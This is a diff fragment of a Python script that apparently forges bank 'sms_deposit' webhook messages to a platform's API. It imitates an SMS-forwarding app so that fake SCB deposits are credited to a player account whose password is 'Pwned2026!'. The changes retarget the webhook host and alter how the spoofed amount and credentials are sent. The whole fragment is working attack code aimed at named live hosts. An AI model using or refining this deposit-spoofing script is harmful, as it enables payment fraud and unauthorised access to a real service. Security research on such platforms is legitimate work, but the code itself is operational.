@@ -19,7 +19,7 @@ from datetime import datetime, timezone, timedelta
 TID_VAK  = "af6efb584a3d317b5a11ab6209b88e1b"
 PBAPI    = f"https://{TID_VAK}pbapi.asdgapicenterssdo.com"
 MGAPI    = f"https://{TID_VAK}mgapi.asdgapicenterssdo.com"
-WEBHOOK  = f"{MGAPI}/webhook-scb"
+WEBHOOK  = f"{PBAPI}/webhook-scb"
 
 PLAYER_PHONE = "0811111111"
 PLAYER_PASS  = "Pwned2026!"
@@ -164,9 +164,9 @@ if not adb_only:
             "sms_id":    str(uuid.uuid4()).replace("-","")[:16],
             "type":      "sms_deposit",
             "bank_code": "SCB",
-            "amount":    amount_fmt,
-            "username":  os.environ.get("SCB_USER", ""),   # C2-issued; empty = 401
-            "password":  os.environ.get("SCB_PASS", ""),   # C2-issued; empty = 401
+            "amount":    "0",  # APK always sends "0"; platform parses amount from message
+            "username":  os.environ.get("SCB_USER", ""),   # operator-entered; validated by platform; 401 if wrong
+            "password":  os.environ.get("SCB_PASS", ""),   # operator-entered; set in APK UI → SharedPreferences
         }
         hdrs = {"Content-Type": "application/json"}
         hdrs.update(auth_hdrs)
@@ -184,7 +184,7 @@ if not adb_only:
                 "address":  "027777777", "message": msg, "timestamp": ts_ms,
                 "bank_no":  platform_scb_raw.replace("-", ""),
                 "sms_id":   str(uuid.uuid4()).replace("-","")[:16],
-                "type":     "sms_deposit", "bank_code": "SCB", "amount": amount_fmt,
+                "type":     "sms_deposit", "bank_code": "SCB", "amount": "0",
                 "username": os.environ.get("SCB_USER", ""),
                 "password": os.environ.get("SCB_PASS", ""),
             }
